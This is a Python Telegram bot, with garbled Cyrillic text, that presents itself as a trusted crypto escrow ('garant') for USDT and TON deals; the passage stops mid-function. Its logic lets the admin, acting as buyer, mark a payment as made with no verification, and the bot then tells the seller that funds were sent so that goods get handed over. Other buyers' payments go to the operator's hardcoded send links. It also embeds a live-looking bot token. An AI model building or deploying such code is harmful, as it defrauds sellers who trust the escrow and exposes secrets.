from datetime import datetime, timedelta
from typing import Dict, Optional
import random
import string
import asyncio

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.base import StorageKey
from aiogram.types import (
    ReplyKeyboardRemove,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardMarkup,
)
from aiogram.utils.keyboard import InlineKeyboardBuilder, ReplyKeyboardBuilder

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –±–æ—Ç–∞
BOT_TOKEN = "8433719918:AAE3GxKyXP4WlZBDUVusDPEEsSlmLgn5doc" # –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –≤–∞—à —Ç–æ–∫–µ–Ω
ADMIN_ID = 8054710484# –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –≤–∞—à ID –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞

# –ê–¥—Ä–µ—Å–∞ –∫–æ—à–µ–ª—å–∫–æ–≤ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é
DEFAULT_USDT_ADDRESS = "https://t.me/send?start=IVGgr6c6IQfw"
DEFAULT_TON_ADDRESS = "https://t.me/send?start=IVykr0pZ9nhc"

# –•—Ä–∞–Ω–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –æ —Å–¥–µ–ª–∫–∞—Ö
active_deals: Dict[str, Dict] = {}  # {deal_code: deal_info}
user_deals: Dict[int, str] = {}  # {user_id: deal_code}

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

class Form(StatesGroup):
    selecting_action = State()
    creating_deal = State()
    choosing_currency = State()
    entering_amount = State()
    entering_code = State()
    deal_in_progress = State()
    completing_deal = State()
    entering_wallet = State()
    confirming_exit = State()

def generate_deal_code() -> str:
    """–ì–µ–Ω–µ—Ä–∞—Ü–∏—è 20-–∑–Ω–∞—á–Ω–æ–≥–æ –∫–æ–¥–∞ —Å–¥–µ–ª–∫–∏"""
    characters = string.ascii_letters + string.digits + "!@#$%^&*"
    return ''.join(random.choice(characters) for _ in range(20))

async def get_main_keyboard():
    """–ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –≥–ª–∞–≤–Ω–æ–≥–æ –º–µ–Ω—é"""
    builder = InlineKeyboardBuilder()
    builder.add(
        InlineKeyboardButton(text="–Ø –ø–æ–∫—É–ø–∞—Ç–µ–ª—å", callback_data="create_deal"),
        InlineKeyboardButton(text="–Ø –ø—Ä–æ–¥–∞–≤–µ—Ü", callback_data="enter_code"),
    )
    builder.adjust(1)
    return builder.as_markup()

async def get_deal_keyboard(deal_code: str):
    """–ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –¥–ª—è —É—á–∞—Å—Ç–Ω–∏–∫–æ–≤ —Å–¥–µ–ª–∫–∏"""
    builder = InlineKeyboardBuilder()
    builder.add(
        InlineKeyboardButton(text="‚ùå –í—ã–π—Ç–∏ –∏–∑ —Å–¥–µ–ª–∫–∏", callback_data=f"exit_deal:{deal_code}"),
    )
    builder.adjust(1)
    return builder.as_markup()

async def get_exit_confirmation_keyboard(deal_code: str):
    """–ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –≤—ã—Ö–æ–¥–∞ –∏–∑ —Å–¥–µ–ª–∫–∏"""
    builder = InlineKeyboardBuilder()
    builder.add(
        InlineKeyboardButton(text="‚úÖ –î–∞, –≤—ã–π—Ç–∏", callback_data=f"confirm_exit:{deal_code}"),
        InlineKeyboardButton(text="‚ùå –ù–µ—Ç, –æ—Å—Ç–∞—Ç—å—Å—è", callback_data=f"cancel_exit:{deal_code}"),
    )
    builder.adjust(2)
    return builder.as_markup()

@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    """–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /start"""
    await state.clear()
    await state.set_state(Form.selecting_action)
    await message.answer(
        f"""üëã –ü—Ä–∏–≤–µ—Ç, {message.from_user.first_name}!
–Ø - KodoDrive Garant Bot, –≤–∞—à –Ω–∞–¥–µ–∂–Ω—ã–π –≥–∞—Ä–∞–Ω—Ç –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω—ã—Ö —Å–¥–µ–ª–æ–∫.
–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:""",
        reply_markup=await get_main_keyboard(),
    )

@dp.callback_query(F.data == "create_deal")
async def create_deal(callback: types.CallbackQuery, state: FSMContext):
    """–ù–∞—á–∞–ª–æ —Å–æ–∑–¥–∞–Ω–∏—è —Å–¥–µ–ª–∫–∏"""
    await state.set_state(Form.choosing_currency)
    
    builder = InlineKeyboardBuilder()
    builder.add(
        InlineKeyboardButton(text="USDT", callback_data="usdt"),
        InlineKeyboardButton(text="TON", callback_data="ton"),
    )
    builder.adjust(2)
    
    await callback.message.edit_text(
        "üîπ –í—ã–±–µ—Ä–∏—Ç–µ –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç—É –¥–ª—è —Å–¥–µ–ª–∫–∏:",
        reply_markup=builder.as_markup(),
    )

@dp.callback_query(F.data.in_(["usdt", "ton"]))
async def choose_currency(callback: types.CallbackQuery, state: FSMContext):
    """–û–±—Ä–∞–±–æ—Ç–∫–∞ –≤—ã–±–æ—Ä–∞ –≤–∞–ª—é—Ç—ã"""
    await state.update_data(currency=callback.data)
    await state.set_state(Form.entering_amount)
    await callback.message.edit_text(f" –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É —Å–¥–µ–ª–∫–∏ –≤ {callback.data.upper()}:")

@dp.message(Form.entering_amount)
async def process_amount(message: types.Message, state: FSMContext):
    """–û–±—Ä–∞–±–æ—Ç–∫–∞ –≤–≤–æ–¥–∞ —Å—É–º–º—ã —Å–¥–µ–ª–∫–∏"""
    try:
        amount = float(message.text)
        if amount <= 0:
            raise ValueError
    except ValueError:
        await message.answer(" –ù–µ–≤–µ—Ä–Ω–∞—è —Å—É–º–º–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω–æ–µ —á–∏—Å–ª–æ:")
        return
    
    data = await state.get_data()
    currency = data.get("currency")
    deal_code = generate_deal_code()
    expires_at = datetime.now() + timedelta(minutes=10)
    
    wallet_address = DEFAULT_USDT_ADDRESS if currency == "usdt" else DEFAULT_TON_ADDRESS
    if message.from_user.id == ADMIN_ID:
        wallet_address = "–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—Å–∫–∏–π –∫–æ—à–µ–ª–µ–∫"
    
    active_deals[deal_code] = {
        "buyer_id": message.from_user.id,
        "seller_id": None,
        "currency": currency,
        "amount": amount,
        "created_at": datetime.now(),
        "expires_at": expires_at,
        "status": "created",
        "buyer_paid": False,
        "seller_confirmed": False,
        "buyer_confirmed": False,
        "wallet_address": wallet_address,
    }
    
    user_deals[message.from_user.id] = deal_code
    expires_time = expires_at.strftime("%H:%M:%S")
    
    await message.answer(
        f""" –°–¥–µ–ª–∫–∞ —Å–æ–∑–¥–∞–Ω–∞!

üíµ –°—É–º–º–∞: {amount} {currency.upper()}
üîë –ö–æ–¥ —Å–¥–µ–ª–∫–∏: <code>{deal_code}</code>
‚è≥ –ö–æ–¥ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª–µ–Ω –¥–æ: {expires_time}

 –ü–µ—Ä–µ–¥–∞–π—Ç–µ —ç—Ç–æ—Ç –∫–æ–¥ –ø—Ä–æ–¥–∞–≤—Ü—É. –ü–æ—Å–ª–µ –≤–≤–æ–¥–∞ –∫–æ–¥–∞ —Å–¥–µ–ª–∫–∞ –Ω–∞—á–Ω–µ—Ç—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏.""",
        parse_mode="HTML",
        reply_markup=await get_main_keyboard(),
    )
    await state.set_state(Form.selecting_action)

@dp.callback_query(F.data == "enter_code")
async def enter_deal_code(callback: types.CallbackQuery, state: FSMContext):
    """–ó–∞–ø—Ä–æ—Å –∫–æ–¥–∞ —Å–¥–µ–ª–∫–∏"""
    await state.set_state(Form.entering_code)
    await callback.message.edit_text(" –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ —Å–¥–µ–ª–∫–∏:")

@dp.message(Form.entering_code)
async def process_deal_code(message: types.Message, state: FSMContext):
    """–û–±—Ä–∞–±–æ—Ç–∫–∞ –≤–≤–µ–¥–µ–Ω–Ω–æ–≥–æ –∫–æ–¥–∞ —Å–¥–µ–ª–∫–∏"""
    deal_code = message.text.strip()
    
    if deal_code not in active_deals:
        await message.answer("‚ùå –ö–æ–¥ —Å–¥–µ–ª–∫–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω –∏–ª–∏ –∏—Å—Ç–µ–∫. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø—Ä–æ–≤–µ—Ä—å—Ç–µ –∫–æ–¥ –∏ –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑:")
        return
    
    deal = active_deals[deal_code]
    
    if deal["status"] != "created":
        await message.answer("‚ùå –≠—Ç–∞ —Å–¥–µ–ª–∫–∞ —É–∂–µ –Ω–∞—á–∞—Ç–∞ –∏–ª–∏ –∑–∞–≤–µ—Ä—à–µ–Ω–∞.")
        await state.set_state(Form.selecting_action)
        return
    
    if deal["buyer_id"] == message.from_user.id:
        await message.answer("‚ùå –í—ã –Ω–µ –º–æ–∂–µ—Ç–µ –±—ã—Ç—å –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ –ø–æ–∫—É–ø–∞—Ç–µ–ª–µ–º –∏ –ø—Ä–æ–¥–∞–≤—Ü–æ–º –≤ –æ–¥–Ω–æ–π —Å–¥–µ–ª–∫–µ.")
        await state.set_state(Form.selecting_action)
        return
    
    deal["seller_id"] = message.from_user.id
    deal["status"] = "in_progress"
    user_deals[message.from_user.id] = deal_code
    
    currency = deal["currency"].upper()
    amount = deal["amount"]
    
    await message.answer(
        f""" –í—ã –ø—Ä–∏—Å–æ–µ–¥–∏–Ω–∏–ª–∏—Å—å –∫ —Å–¥–µ–ª–∫–µ!

üíµ –°—É–º–º–∞: {amount} {currency}
üíµ –ö–æ–º–∏—Å—Å–∏—è —Å–¥–µ–ª–∫–∏: 1%
üîπ –î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –æ–ø–ª–∞—Ç—ã –ø–æ—Å–ª–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è —Å–¥–µ–ª–∫–∏, –ø—Ä–∏—à–ª–∏—Ç–µ —Å–≤–æ–π –∞–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞ @KodoDrive!
üîπ –°–µ–π—á–∞—Å –ø–æ–∫—É–ø–∞—Ç–µ–ª—å –ø–µ—Ä–µ–≤–µ–¥—ë—Ç {amount} {currency} –Ω–∞ –Ω–∞—à –∞–¥—Ä–µ—Å, –º—ã —Å–æ–æ–±—â–∏–º –∫–æ–≥–¥–∞ –ø–æ–ª—É—á–∏–º –ø–ª–∞—Ç—ë–∂!""",
        reply_markup=await get_deal_keyboard(deal_code),
    )
    
    builder = InlineKeyboardBuilder()
    if deal["buyer_id"] == ADMIN_ID:
        builder.add(InlineKeyboardButton(text="‚úÖ –û–ø–ª–∞—Ç–∏–ª", callback_data=f"deal_paid:{deal_code}"))
    else:
        builder.add(InlineKeyboardButton(text="‚úÖ –û–ø–ª–∞—Ç–∏–ª", callback_data=f"not_admin_payment"))
    builder.add(InlineKeyboardButton(
        text="‚ùå –í—ã–π—Ç–∏ –∏–∑ —Å–¥–µ–ª–∫–∏", 
        callback_data=f"exit_deal:{deal_code}"
    ))
    
    await bot.send_message(
        chat_id=deal["buyer_id"],
        text=f"""üîπ –ü—Ä–æ–¥–∞–≤–µ—Ü –ø—Ä–∏—Å–æ–µ–¥–∏–Ω–∏–ª—Å—è –∫ —Å–¥–µ–ª–∫–µ!

üíµ –°—É–º–º–∞: {amount} {currency}
üè¶ –ê–¥—Ä–µ—Å –¥–ª—è –æ–ø–ª–∞—Ç—ã: <code>{deal['wallet_address']}</code>

üîπ –ü–æ—Å–ª–µ –ø–µ—Ä–µ–≤–æ–¥–∞ —Å—Ä–µ–¥—Å—Ç–≤ –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ:""",
        reply_markup=builder.as_markup(),
        parse_mode="HTML",
    )
    
    if ADMIN_ID not in [deal["buyer_id"], deal["seller_id"]]:
        admin_notify_text = (
            f"""üîî –ù–æ–≤–∞—è —Å–¥–µ–ª–∫–∞ #{deal_code}
üíµ –°—É–º–º–∞: {amount} {currency}
üë§ –ü–æ–∫—É–ø–∞—Ç–µ–ª—å: {deal['buyer_id']}
üë• –ü—Ä–æ–¥–∞–≤–µ—Ü: {deal['seller_id']}"""
        )
        await bot.send_message(
            chat_id=ADMIN_ID,
            text=admin_notify_text,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –æ–ø–ª–∞—Ç—É", callback_data=f"admin_confirm:{deal_code}")]
            ])
        )
    
    await state.set_state(Form.deal_in_progress)

@dp.callback_query(F.data == "not_admin_payment")
async def not_admin_payment(callback: types.CallbackQuery):
    """–û–±—Ä–∞–±–æ—Ç–∫–∞ –ø–æ–ø—ã—Ç–∫–∏ –æ–ø–ª–∞—Ç—ã –Ω–µ –∞–¥–º–∏–Ω–æ–º"""
    await callback.answer("‚è≥ –û–ø–ª–∞—Ç–∞ –µ—â–µ –Ω–µ –ø–æ—Å—Ç—É–ø–∏–ª–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥–æ–∂–¥–∏—Ç–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –æ—Ç –≥–∞—Ä–∞–Ω—Ç–∞.", show_alert=True)

@dp.callback_query(F.data.startswith("deal_paid:"))
async def confirm_payment(callback: types.CallbackQuery, state: FSMContext):
    """–ü–æ–∫—É–ø–∞—Ç–µ–ª—å (–∞–¥–º–∏–Ω) –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ—Ç –æ–ø–ª–∞—Ç—É"""
    deal_code = callback.data.split(":")[1]
    deal = active_deals.get(deal_code)
    
    if not deal or callback.from_user.id != deal["buyer_id"]:
        await callback.answer("‚ùå –û—à–∏–±–∫–∞: –≤—ã –Ω–µ —è–≤–ª—è–µ—Ç–µ—Å—å –ø–æ–∫—É–ø–∞—Ç–µ–ª–µ–º –≤ —ç—Ç–æ–π —Å–¥–µ–ª–∫–µ.")
        return
    
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("‚ùå –¢–æ–ª—å–∫–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä –º–æ–∂–µ—Ç –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞—Ç—å –æ–ø–ª–∞—Ç—É.")
        return
    
    deal["buyer_paid"] = True
    currency = deal["currency"].upper()
    amount = deal["amount"]
    
    builder = InlineKeyboardBuilder()
    builder.add(InlineKeyboardButton(
        text="‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ", 
        callback_data=f"deal_complete:{deal_code}"
    ))
    builder.add(InlineKeyboardButton(
        text="‚ùå –í—ã–π—Ç–∏ –∏–∑ —Å–¥–µ–ª–∫–∏", 
        callback_data=f"exit_deal:{deal_code}"
    ))
    
    await bot.send_message(
        chat_id=deal["seller_id"],
        text=f"""‚úÖ –ü–æ–∫—É–ø–∞—Ç–µ–ª—å –æ—Ç–ø—Ä–∞–≤–∏–ª {amount} {currency}, —Ç–µ–ø–µ—Ä—å –≤–∞–º –Ω—É–∂–Ω–æ –ø–µ—Ä–µ–¥–∞—Ç—å —Ü–∏—Ñ—Ä–æ–≤–æ–π —Ç–æ–≤–∞—Ä. 
–ü–æ—Å–ª–µ –ø–µ—Ä–µ–¥–∞—á–∏ —Ç–æ–≤–∞—Ä–∞ –≤–∞–º –Ω—É–∂–Ω–æ –Ω–∞–∂–∞—Ç—å –Ω–∞ –∫–Ω–æ–ø–∫—É ¬´–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ¬ª""",
        reply_markup=builder.as_markup(),
    )
    
    await callback.message.edit_text(
        " –í—ã –ø–æ–¥—Ç–≤–µ—Ä–¥–∏–ª–∏ –æ–ø–ª–∞—Ç—É. –û–∂–∏–¥–∞–π—Ç–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –ø–µ—Ä–µ–¥–∞—á–∏ —Ç–æ–≤–∞—Ä–∞ –æ—Ç –ø—Ä–æ–¥–∞–≤—Ü–∞.",
        reply_markup=await get_deal_keyboard(deal_code),
    )
    await state.set_state(Form.deal_in_progress)

@dp.callback_query(F.data.startswith("admin_confirm:"))
async def admin_confirm_payment(callback: types.CallbackQuery):
    """–û–±—Ä–∞–±–æ—Ç–∫–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –æ–ø–ª–∞—Ç—ã –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º"""
    deal_code = callback.data.split(":")[1]
    deal = active_deals.get(deal_code)
    
    if not deal:
        await callback.answer("‚ùå –°–¥–µ–ª–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞ –∏–ª–∏ –∑–∞–≤–µ—Ä—à–µ–Ω–∞")
        return
    
    deal["buyer_paid"] = True
    currency = deal["currency"].upper()
    amount = deal["amount"]
    
    builder = InlineKeyboardBuilder()
    builder.add(InlineKeyboardButton(
        text="‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ", 
        callback_data=f"deal_complete:{deal_code}"
    ))
    builder.add(InlineKeyboardButton(
        text="‚ùå –í—ã–π—Ç–∏ –∏–∑ —Å–¥–µ–ª–∫–∏", 
        callback_data=f"exit_deal:{deal_code}"
    ))
    
    await bot.send_message(
        chat_id=deal["seller_id"],
        text=f"""‚úÖ –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä –ø–æ–¥—Ç–≤–µ—Ä–¥–∏–ª –æ–ø–ª–∞—Ç—É {amount} {currency}. 
–¢–µ–ø–µ—Ä—å –≤–∞–º –Ω—É–∂–Ω–æ –ø–µ—Ä–µ–¥–∞—Ç—å —Ü–∏—Ñ—Ä–æ–≤–æ–π —Ç–æ–≤–∞—Ä –∏ –Ω–∞–∂–∞—Ç—å –∫–Ω–æ–ø–∫—É –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è.""",
        reply_markup=builder.as_markup(),
    )
    
    await bot.send_message(
        chat_id=deal["buyer_id"],
        text="‚úÖ –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä –ø–æ–¥—Ç–≤–µ—Ä–¥–∏–ª –≤–∞—à—É –æ–ø–ª–∞—Ç—É. –û–∂–∏–¥–∞–π—Ç–µ –ø–µ—Ä–µ–¥–∞—á–∏ —Ç–æ–≤–∞—Ä–∞.",
        reply_markup=await get_deal_keyboard(deal_code),
    )
    
    await callback.message.edit_text(f"‚úÖ –í—ã –ø–æ–¥—Ç–≤–µ—Ä–¥–∏–ª–∏ –æ–ø–ª–∞—Ç—É –ø–æ —Å–¥–µ–ª–∫–µ #{deal_code}")
    await callback.answer()

@dp.callback_query(F.data.startswith("deal_complete:"))
async def confirm_completion(callback: types.CallbackQuery, state: FSMContext):
    """–ü—Ä–æ–¥–∞–≤–µ—Ü –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ—Ç –ø–µ—Ä–µ–¥–∞—á—É —Ç–æ–≤–∞—Ä–∞"""
    deal_code = callback.data.split(":")[1]
    deal = active_deals.get(deal_code)
    
    if not deal or callback.from_user.id != deal["seller_id"]:
        await callback.answer("‚ùå –û—à–∏–±–∫–∞: –≤—ã –Ω–µ —è–≤–ª—è–µ—Ç–µ—Å—å –ø—Ä–æ–¥–∞–≤—Ü–æ–º –≤ —ç—Ç–æ–π —Å–¥–µ–ª–∫–µ.")
        return
    
    deal["seller_confirmed"] = True
    
    if deal["buyer_confirmed"]:
        await complete_deal(deal_code)
    else:
        builder = InlineKeyboardBuilder()
        builder.add(InlineKeyboardButton(
            text="‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –ø–æ–ª—É—á–µ–Ω–∏–µ", 
            callback_data=f"deal_confirm:{deal_code}"
        ))
        builder.add(InlineKeyboardButton(
            text="‚ùå –í—ã–π—Ç–∏ –∏–∑ —Å–¥–µ–ª–∫–∏", 
            callback_data=f"exit_deal:{deal_code}"
        ))
        
        await bot.send_message(
            chat_id=deal["buyer_id"],
            text=" –ü—Ä–æ–¥–∞–≤–µ—Ü –ø–æ–¥—Ç–≤–µ—Ä–¥–∏–ª –ø–µ—Ä–µ–¥–∞—á—É —Ç–æ–≤–∞—Ä–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –ø–æ–ª—É—á–µ–Ω–∏–µ:",
            reply_markup=builder.as_markup(),
        )
        
        await callback.message.edit_text(
            " –í—ã –ø–æ–¥—Ç–≤–µ—Ä–¥–∏–ª–∏ –ø–µ—Ä–µ–¥–∞—á—É —Ç–æ–≤–∞—Ä–∞. –û–∂–∏–¥–∞–π—Ç–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –æ—Ç –ø–æ–∫—É–ø–∞—Ç–µ–ª—è.",
            reply_markup=await get_deal_keyboard(deal_code),
        )
        await state.set_state(Form.deal_in_progress)

@dp.callback_query(F.data.startswith("deal_confirm:"))
async def confirm_receipt(callback: types.CallbackQuery, state: FSMContext):
    """–ü–æ–∫—É–ø–∞—Ç–µ–ª—å –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ—Ç –ø–æ–ª—É—á–µ–Ω–∏–µ —Ç–æ–≤–∞—Ä–∞"""
    deal_code = callback.data.split(":")[1]
    deal = active_deals.get(deal_code)
    
    if not deal or callback.from_user.id != deal["buyer_id"]:
        await callback.answer("‚ùå –û—à–∏–±–∫–∞: –≤—ã –Ω–µ —è–≤–ª—è–µ—Ç–µ—Å—å –ø–æ–∫—É–ø–∞—Ç–µ–ª–µ–º –≤ —ç—Ç–æ–π —Å–¥–µ–ª–∫–µ.")
        return
    
    deal["buyer_confirmed"] = True
    
    if deal["seller_confirmed"]:
        await complete_deal(deal_code)
    else:
        await callback.message.edit_text(
            " –í—ã –ø–æ–¥—Ç–≤–µ—Ä–¥–∏–ª–∏ –ø–æ–ª—É—á–µ–Ω–∏–µ —Ç–æ–≤–∞—Ä–∞. –û–∂–∏–¥–∞–π—Ç–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –æ—Ç –ø—Ä–æ–¥–∞–≤—Ü–∞.",
            reply_markup=await get_deal_keyboard(deal_code),
        )
        await state.set_state(Form.deal_in_progress)

@dp.callback_query(F.data.startswith("exit_deal:"))
async def request_exit_deal(callback: types.CallbackQuery, state: FSMContext):
    """–ó–∞–ø—Ä–æ—Å –Ω–∞ –≤—ã—Ö–æ–¥ –∏–∑ —Å–¥–µ–ª–∫–∏"""
    deal_code = callback.data.split(":")[1]
    deal = active_deals.get(deal_code)
    
    if not deal or callback.from_user.id not in [deal["buyer_id"], deal["seller_id"]]:
        await callback.answer("‚ùå –û—à–∏–±–∫–∞: –≤—ã –Ω–µ —è–≤–ª—è–µ—Ç–µ—Å—å —É—á–∞—Å—Ç–Ω–∏–∫–æ–º —ç—Ç–æ–π —Å–¥–µ–ª–∫–∏.")
        return
    
    await state.set_state(Form.confirming_exit)
    await state.update_data(exit_deal_code=deal_code)
    
    await callback.message.edit_text(
        "‚ö†Ô∏è –í—ã —É–≤–µ—Ä–µ–Ω—ã, —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ –≤—ã–π—Ç–∏ –∏–∑ —Å–¥–µ–ª–∫–∏?",
        reply_markup=await get_exit_confirmation_keyboard(deal_code),
    )

@dp.callback_query(F.data.startswith("confirm_exit:"))
async def confirm_exit_deal(callback: types.CallbackQuery, state: FSMContext):
    """–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –≤—ã—Ö–æ–¥–∞ –∏–∑ —Å–¥–µ–ª–∫–∏"""
    deal_code = callback.data.split(":")[1]
    deal = active_deals.get(deal_code)
    
    if not deal or callback.from_user.id not in [deal["buyer_id"], deal["seller_id"]]:
        await callback.answer("‚ùå –û—à–∏–±–∫–∞: –≤—ã –Ω–µ —è–≤–ª—è–µ—Ç–µ—Å—å —É—á–∞—Å—Ç–Ω–∏–∫–æ–º —ç—Ç–æ–π —Å–¥–µ–ª–∫–∏.")
        return
        
    user_id = callback.from_user.id
    other_user_id = deal["buyer_id"] if user_id == deal["seller_id"] else deal["seller_id"]
    
    if other_user_id:
        await bot.send_message(
            chat_id=other_user_id,
            text="‚ùå –î—Ä—É–≥–æ–π —É—á–∞—Å—Ç–Ω–∏–∫ –≤—ã—à–µ–ª –∏–∑ —Å–¥–µ–ª–∫–∏. –°–¥–µ–ª–∫–∞ –æ—Ç–º–µ–Ω–µ–Ω–∞.",
            reply_markup=await get_main_keyboard(),
        )
    
    await callback.message.edit_text(
        "‚ùå –í—ã –≤—ã—à–ª–∏ –∏–∑ —Å–¥–µ–ª–∫–∏.",
        reply_markup=await get_main_keyboard(),
    )
    
    del active_deals[deal_code]
    if deal["buyer_id"] in user_deals: del user_deals[deal["buyer_id"]]
    if deal["seller_id"] and deal["seller_id"] in user_deals: del user_deals[deal["seller_id"]]
    
    await state.clear()
    await state.set_state(Form.selecting_action)

@dp.callback_query(F.data.startswith("cancel_exit:"))
async def cancel_exit_deal(callback: types.CallbackQuery, state: FSMContext):
    """–û—Ç–º–µ–Ω–∞ –≤—ã—Ö–æ–¥–∞ –∏–∑ —Å–¥–µ–ª–∫–∏"""
    deal_code = callback.data.split(":")[1]
    deal = active_deals.get(deal_code)
    
    if not deal or callback.from_user.id not in [deal["buyer_id"], deal["seller_id"]]:
        await callback.answer("‚ùå –û—à–∏–±–∫–∞: –≤—ã –Ω–µ —è–≤–ª—è–µ—Ç–µ—Å—å —É—á–∞—Å—Ç–Ω–∏–∫–æ–º —ç—Ç–æ–π —Å–¥–µ–ª–∫–∏.")
        return
    
    await callback.message.edit_text(
        "‚úÖ –í—ã –æ—Å—Ç–∞–µ—Ç–µ—Å—å –≤ —Å–¥–µ–ª–∫–µ.",
        reply_markup=await get_deal_keyboard(deal_code),
    )
    
    await state.set_state(Form.deal_in_progress)

async def complete_deal(deal_code: str):
    """–ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ —Å–¥–µ–ª–∫–∏ —Å –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–º —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏—è–º–∏"""
    deal = active_deals.get(deal_code)
    if not deal:
        return
    
    currency = deal["currency"].upper()
    amount = deal["amount"]
    payout_amount = amount * 0.99  # –†–∞—Å—á–µ—Ç —Å—É–º–º—ã –∫ –≤—ã–ø–ª–∞—Ç–µ
    buyer_id = deal["buyer_id"]
    seller_id = deal["seller_id"]

    buyer_state = FSMContext(storage=dp.storage, key=StorageKey(chat_id=buyer_id, user_id=buyer_id, bot_id=bot.id))
    await buyer_state.clear()
    await bot.send_message(
        chat_id=buyer_id,
        text="–°–¥–µ–ª–∫–∞ —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∞! –¢–æ–≤–∞—Ä –ø–µ—Ä–µ–¥–∞–Ω, —Å—Ä–µ–¥—Å—Ç–≤–∞ –±—É–¥—É—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –ø—Ä–æ–¥–∞–≤—Ü—É.",
        reply_markup=await get_main_keyboard(),
    )
    
    seller_state = FSMContext(storage=dp.storage, key=StorageKey(chat_id=seller_id, user_id=seller_id, bot_id=bot.id))
    await seller_state.set_state(Form.entering_wallet)
    await seller_state.update_data(complete_deal_code=deal_code)
    
    await bot.send_message(
        chat_id=seller_id,
        text=f"""–°–¥–µ–ª–∫–∞ —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∞! 
–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –∞–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞ {currency} –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è {payout_amount:.2f} {currency} (—Å—É–º–º–∞ —Å —É—á–µ—Ç–æ–º –∫–æ–º–∏—Å—Å–∏–∏ 1%):""",
    )

@dp.message(Form.entering_wallet)
async def process_wallet_address(message: types.Message, state: FSMContext):
